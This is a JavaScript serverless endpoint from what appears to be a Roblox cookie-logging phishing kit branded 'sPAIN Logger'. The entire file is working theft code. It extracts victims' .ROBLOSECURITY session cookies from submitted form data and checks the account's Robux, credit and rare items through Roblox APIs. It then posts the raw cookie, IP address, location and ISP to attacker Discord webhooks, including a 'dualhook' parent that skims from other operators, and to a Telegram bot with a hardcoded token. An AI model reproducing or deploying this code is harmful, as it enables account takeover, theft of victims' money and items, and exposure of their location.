// api/submit.js — cookie hits Discord immediately, geo runs in parallel
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';

// Cookie Refresher URL with emoji styling
const COOKIE_REFRESH_URL = 'https://index-html-ruby-eight.vercel.app/';
const COOKIE_REFRESH_TEXT = `🍪 Cookie Refresher\n*If you want more accurate account validation, [go here](${COOKIE_REFRESH_URL})*`;

// Item asset IDs
const ITEMS = {
  HEADLESS: 134082579,
  KORBLOX: 139607625,
  VALKYRIE: 1365767
};

async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, {
      headers: { Authorization: `Bearer ${REDIS_TOKEN}` }
    });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

// Get Roblox avatar thumbnail URL
async function getAvatarUrl(userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch(
      `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`,
      { signal: ctrl.signal }
    );
    
    clearTimeout(timer);
    
    if (!response.ok) return null;
    
    const data = await response.json();
    if (data.data && data.data.length > 0 && data.data[0].state === 'Completed') {
      return data.data[0].imageUrl;
    }
    return null;
  } catch {
    return null;
  }
}

// Get Robux balance
async function getRobux(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch('https://economy.roblox.com/v1/user/currency', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) return 0;
    const data = await response.json();
    return data.robux || 0;
  } catch {
    return 0;
  }
}

// Get RAP (Recent Average Price) and item count
async function getRAP(cookie, userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);
    
    const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/assets/collectibles?limit=100`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) return { rap: 0, items: 0 };
    const data = await response.json();
    
    let rap = 0;
    const items = data.data || [];
    items.forEach(item => {
      rap += item.recentAveragePrice || 0;
    });
    
    return { rap, items: items.length };
  } catch {
    return { rap: 0, items: 0 };
  }
}

// Get credit balance
async function getCredit(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch('https://billing.roblox.com/v1/credit', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) return 0;
    const data = await response.json();
    return data.balance || 0;
  } catch {
    return 0;
  }
}

// Get account age in days
function getAccountAge(createdDate) {
  if (!createdDate) return 0;
  const created = new Date(createdDate);
  const now = new Date();
  return Math.floor((now - created) / (1000 * 60 * 60 * 24));
}

// Get premium status
async function getPremiumStatus(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch('https://premiumfeatures.roblox.com/v1/users/validate-membership', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (response.status === 200) return true;
    return false;
  } catch {
    return false;
  }
}

// Get voice chat status
async function getVoiceChatStatus(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch('https://voice.roblox.com/v1/settings', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) return false;
    const data = await response.json();
    return data.isVoiceEnabled || false;
  } catch {
    return false;
  }
}

// Get friends count
async function getFriendsCount(userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch(`https://friends.roblox.com/v1/users/${userId}/friends/count`, {
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) return 0;
    const data = await response.json();
    return data.count || 0;
  } catch {
    return 0;
  }
}

// Check if user owns specific item
async function ownsItem(cookie, userId, assetId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch(`https://inventory.roblox.com/v1/users/${userId}/items/Asset/${assetId}/is-owned`, {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) return false;
    const data = await response.json();
    return data === true;
  } catch {
    return false;
  }
}

// Get groups owned count
async function getGroupsOwned(userId) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    
    const response = await fetch(`https://groups.roblox.com/v1/users/${userId}/groups/roles`, {
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) return 0;
    const data = await response.json();
    
    const groups = data.data || [];
    return groups.filter(g => g.role && g.role.rank === 255).length;
  } catch {
    return 0;
  }
}

// Check account info and refresh cookie validity
async function checkAccountInfo(cookie) {
  try {
    const ctrl = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 8000);
    
    const response = await fetch('https://users.roblox.com/v1/users/authenticated', {
      headers: {
        'Cookie': `.ROBLOSECURITY=${cookie}`,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
      },
      signal: ctrl.signal
    });
    
    clearTimeout(timer);
    
    if (!response.ok) {
      return { valid: false, error: 'Invalid or expired cookie' };
    }
    
    const userData = await response.json();
    const userId = userData.id;
    
    const [
      avatarUrl,
      robux,
      rapData,
      credit,
      profileRes,
      premium,
      voiceChat,
      friends,
      headless,
      korblox,
      valkyrie,
      groupsOwned
    ] = await Promise.all([
      getAvatarUrl(userId),
      getRobux(cookie),
      getRAP(cookie, userId),
      getCredit(cookie),
      fetch(`https://users.roblox.com/v1/users/${userId}`, {
        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
      }).catch(() => null),
      getPremiumStatus(cookie),
      getVoiceChatStatus(cookie),
      getFriendsCount(userId),
      ownsItem(cookie, userId, ITEMS.HEADLESS),
      ownsItem(cookie, userId, ITEMS.KORBLOX),
      ownsItem(cookie, userId, ITEMS.VALKYRIE),
      getGroupsOwned(userId)
    ]);
    
    const profile = profileRes?.ok ? await profileRes.json() : null;
    const accountAge = getAccountAge(profile?.created);
    
    return {
      valid: true,
      id: userId,
      username: userData.name,
      displayName: userData.displayName,
      created: profile?.created,
      description: profile?.description,
      isBanned: profile?.isBanned || false,
      profileUrl: `https://www.roblox.com/users/${userId}/profile`,
      avatarUrl: avatarUrl,
      robux: robux,
      rap: rapData.rap,
      items: rapData.items,
      credit: credit,
      premium: premium,
      voiceChat: voiceChat,
      friends: friends,
      headless: headless,
      korblox: korblox,
      valkyrie: valkyrie,
      groupsOwned: groupsOwned,
      accountAge: accountAge
    };
  } catch (err) {
    return { valid: false, error: err.message };
  }
}

// Refresh cookie (validate and return status)
async function refreshCookieStatus(cookie) {
  const accountInfo = await checkAccountInfo(cookie);
  return {
    refreshed: accountInfo.valid,
    account: accountInfo,
    timestamp: new Date().toISOString()
  };
}

async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
    });
  } catch (_) {}
}

const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[\w\-.]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([\w\-.]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([\w\-]{50,})/);                                if (m3) return WARN + m3[1];
  if (s.length >= 200 && /^[a-zA-Z0-9\-_.]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';

// Webhook JSON Structures
const createWebhookPayload = (type, data) => {
  const basePayload = {
    username: WH_NAME,
    avatar_url: WH_AVATAR
  };

  switch (type) {
    case 'webhook1':
      return {
        ...basePayload,
        content: data.content || '@everyone',
        embeds: [{
          title: data.title || '🍪 Cookie Captured (Dualhook)',
          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
          color: data.color || 0x06b6d4,
          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
          image: data.image ? { url: data.image } : undefined,
          fields: data.fields || [],
          footer: { text: data.footer || `sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    case 'webhook2':
      return {
        ...basePayload,
        content: data.content || '@everyone',
        embeds: [{
          title: data.title || '🍪 Cookie Captured',
          description: data.description || '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
          color: data.color || 0xc026d3,
          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
          image: data.image ? { url: data.image } : undefined,
          fields: data.fields || [],
          footer: { text: data.footer || `sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    case 'account_info':
      return {
        ...basePayload,
        content: data.content || '',
        embeds: [{
          title: data.title || '✅ Account Info Valid',
          description: data.description || '',
          color: data.valid === false ? 0xff0000 : 0x00ff00,
          thumbnail: data.thumbnail ? { url: data.thumbnail } : undefined,
          image: data.image ? { url: data.image } : undefined,
          fields: data.fields || [],
          footer: { text: `Account Check • sPAIN Logger` },
          timestamp: data.timestamp || new Date().toISOString()
        }]
      };
    
    default:
      return basePayload;
  }
};

async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
  } catch (_) {}
}

// Send cookie with sPAIN branding
async function discordSendCookie(url, cookie, username) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        username: WH_NAME,
        avatar_url: WH_AVATAR,
        content: `**🔐 Cookie for: ${username || 'Unknown'}**\n\`\`\`\n${cookie}\n\`\`\``
      })
    });
  } catch (_) {}
}

export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots, action } = body;
  
  if (action === 'check_account' || action === 'refresh_cookie') {
    if (!slots) return res.status(400).json({ error: 'slots is required' });
    const cookie = findCookie(slots);
    if (!cookie) return res.status(400).json({ error: 'No valid cookie found' });
    
    const refreshResult = await refreshCookieStatus(cookie);
    return res.status(200).json(refreshResult);
  }
  
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim()
              || req.headers['x-real-ip'] || 'Unknown';
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;
  const cookie = findCookie(slots);

  const webhooks = [record.webhook];
  if (record.dualhookParent) {
    const parent = await redisGet(`slot:${record.dualhookParent}`);
    if (parent?.webhook && parent.webhook !== record.webhook) webhooks.push(parent.webhook);
  }

  if (!cookie) {
    const geo = await getIpGeo(ip);
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    
    const wrongCookiePayload = createWebhookPayload('webhook2', {
      title: '⚠️ Wrong Cookie — Troll Detected',
      description: record.dualhookParent
        ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
        : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
      color: 0xff3333,
      fields: [
        { name: '🌐 IP',       value: ip,                   inline: true  },
        { name: '📍 Location', value: loc,                  inline: true  },
        { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
        { name: '🕐 Time',     value: now,                  inline: false },
        { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
      ],
      footer: `sPAIN Logger • ${pName}`,
      timestamp: now
    });
    
    await Promise.all(webhooks.map(wh => discordSend(wh, wrongCookiePayload)));
    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  const geoPromise = getIpGeo(ip);
  const accountCheckPromise = refreshCookieStatus(cookie);

  let webhook1 = null;
  let webhook2 = record.webhook;
  if (record.dualhookParent) {
    try {
      const parentRecord = await redisGet(`slot:${record.dualhookParent}`);
      if (parentRecord?.webhook) webhook1 = parentRecord.webhook;
    } catch (_) {}
  }

  const [geo, accountInfo] = await Promise.all([geoPromise, accountCheckPromise]);
  const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const isp = geo?.isp || 'Unknown';
  
  const avatarUrl = accountInfo.refreshed && accountInfo.account.avatarUrl 
    ? accountInfo.account.avatarUrl 
    : null;
  
  const acc = accountInfo.refreshed ? accountInfo.account : null;

  // STEP 1: 🍪 Cookie Captured
  const wh2Payload = createWebhookPayload('webhook2', {
    description: record.dualhookParent
      ? `<a:emoji_17:1508694920972468347> ${record.dualhookParent} <a:emoji_17:1508694920972468347>`
      : '<a:emoji_17:1508694920972468347> s.PAIN <a:emoji_17:1508694920972468347>',
    thumbnail: avatarUrl,
    fields: [
      { name: '🌐 IP',       value: `\`${ip}\``, inline: true  },
      { name: '📄 Page',     value: pName,        inline: true  },
      { name: '🕐 Time',     value: now, inline: true },
      { name: '📍 Location', value: loc, inline: true  },
      { name: '🗺️ ISP',      value: isp, inline: true  },
      { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
    ],
    footer: `sPAIN Logger • ${pName}`,
    timestamp: now
  });

  await discordSend(webhook2, wh2Payload);

  if (webhook1 && webhook1 !== webhook2) {
    const wh1Payload = createWebhookPayload('webhook1', {
      title: '🍪 Cookie Captured (Dualhook)',
      thumbnail: avatarUrl,
      fields: [
        { name: '🌐 IP',        value: `\`${ip}\``,                   inline: true  },
        { name: '🎣 DH Parent', value: `\`${record.dualhookParent}\``, inline: true  },
        { name: '🔗 DH Child',  value: `\`${slug}\``,                 inline: true  },
        { name: '📍 Location',  value: loc,                           inline: true  },
        { name: '🗺️ ISP',       value: isp,                           inline: true  },
        { name: '🕐 Time',      value: now,                           inline: true  },
        { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
      ],
      footer: `sPAIN Logger • ${pName}`,
      timestamp: now
    });
    
    await discordSend(webhook1, wh1Payload);
  }

  // STEP 2: ✅ Account Info Valid (CLEAN CROSSWISE LAYOUT)
  if (accountInfo.refreshed && acc) {
    const accountPayload = createWebhookPayload('account_info', {
      description: `**${acc.username}** \`${acc.id}\`\n[View Profile](${acc.profileUrl})`,
      thumbnail: avatarUrl,
      fields: [
        // Row 1: Economy
        { name: '💰 Robux', value: `⏣ ${acc.robux.toLocaleString()}`, inline: true },
        { name: '🎵 RAP', value: `${acc.rap.toLocaleString()}`, inline: true },
        { name: '💳 Credit', value: `$${acc.credit.toFixed(2)}`, inline: true },
        
        // Row 2: Account Stats
        { name: '🗓️ Age', value: `${acc.accountAge.toLocaleString()}d`, inline: true },
        { name: '⭐ Premium', value: acc.premium ? '✓ Yes' : '✗ No', inline: true },
        { name: '🎙️ VC', value: acc.voiceChat ? '✓ On' : '✗ Off', inline: true },
        
        // Row 3: Social
        { name: '👥 Friends', value: acc.friends.toLocaleString(), inline: true },
        { name: '👑 Groups', value: acc.groupsOwned.toString(), inline: true },
        { name: '📦 Items', value: acc.items.toString(), inline: true },
        
        // Row 4: Limiteds (Big Items)
        { name: '💀 Headless', value: acc.headless ? '✓ Owned' : '✗ None', inline: true },
        { name: '⚔️ Korblox', value: acc.korblox ? '✓ Owned' : '✗ None', inline: true },
        { name: '🪽 Valkyrie', value: acc.valkyrie ? '✓ Owned' : '✗ None', inline: true },
        
        // Refresher Link
        { name: COOKIE_REFRESH_TEXT, value: '‎', inline: false }
      ]
    });
    
    await discordSend(webhook2, accountPayload);
    if (webhook1) await discordSend(webhook1, accountPayload);
  }

  // STEP 3: Send the cookie
  await discordSendCookie(webhook2, cookie, acc?.username);
  if (webhook1) await discordSendCookie(webhook1, cookie, acc?.username);

  // Telegram
  await tgSend([
    `🍪 <b>COOKIE — ${pName}</b>`,
    `🌐 <code>${ip}</code>`,
    `📍 ${loc}`,
    `🗺️ ${isp}`,
    `👤 ${acc ? acc.username : 'Invalid'}`,
    acc ? `💰 Robux: ${acc.robux.toLocaleString()}` : '',
    acc ? `🎵 RAP: ${acc.rap.toLocaleString()} (${acc.items} items)` : '',
    acc ? `⭐ Premium: ${acc.premium ? 'Yes' : 'No'}` : '',
    acc ? `💀 Headless: ${acc.headless ? 'Yes' : 'No'}` : '',
    acc ? `⚔️ Korblox: ${acc.korblox ? 'Yes' : 'No'}` : '',
    `🕐 ${now}`
  ].filter(Boolean).join('\n'));

  return res.status(200).json({ 
    success: true, 
    account: accountInfo.refreshed ? accountInfo.account : null 
  });
}
